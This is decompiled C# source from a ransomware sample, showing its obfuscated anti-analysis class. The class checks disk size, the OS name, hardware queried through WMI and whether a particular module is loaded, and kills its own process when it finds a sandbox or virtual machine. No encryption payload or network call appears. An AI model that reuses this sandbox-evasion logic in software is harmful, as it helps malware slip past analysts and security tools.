// Decompiled with JetBrains decompiler
// Type: PMpBbYpvEb.ujCJqLdxCrC
// Assembly: sloc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8380720F-5D35-42C0-94D8-715B8457E8C4
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.Win32.Generic-39a044db72d3ca39122af249cd60660d7e200366af958c762910605eaed020cb.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace PMpBbYpvEb
{
  internal sealed class ujCJqLdxCrC
  {
    [NonSerialized]
    internal static GetString \u008C;

    public static void szmtwNlkzjrCowS()
    {
      if (ujCJqLdxCrC.ThiRrGOmkSFuFbPk() || ujCJqLdxCrC.ZlOPQbXHvav() || ujCJqLdxCrC.vrXvpblMvcvm() || ujCJqLdxCrC.XzLgMdONGIlz())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool vrXvpblMvcvm()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool XzLgMdONGIlz()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(ujCJqLdxCrC.\u008C(107412597)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool ThiRrGOmkSFuFbPk()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(ujCJqLdxCrC.\u008C(107412592)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[ujCJqLdxCrC.\u008C(107412543)].ToString().ToLower();
              if (lower == ujCJqLdxCrC.\u008C(107412494) && managementBaseObject[ujCJqLdxCrC.\u008C(107412497)].ToString().ToUpperInvariant().Contains(ujCJqLdxCrC.\u008C(107412456)) || lower.Contains(ujCJqLdxCrC.\u008C(107412475)) || managementBaseObject[ujCJqLdxCrC.\u008C(107412497)].ToString() == ujCJqLdxCrC.\u008C(107412466))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool ZlOPQbXHvav()
    {
      try
      {
        return ujCJqLdxCrC.BtztOKraQrpdRP(ujCJqLdxCrC.\u008C(107412417)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr BtztOKraQrpdRP([In] string obj0);

    static ujCJqLdxCrC() => Strings.CreateGetStringDelegate(typeof (ujCJqLdxCrC));
  }
}
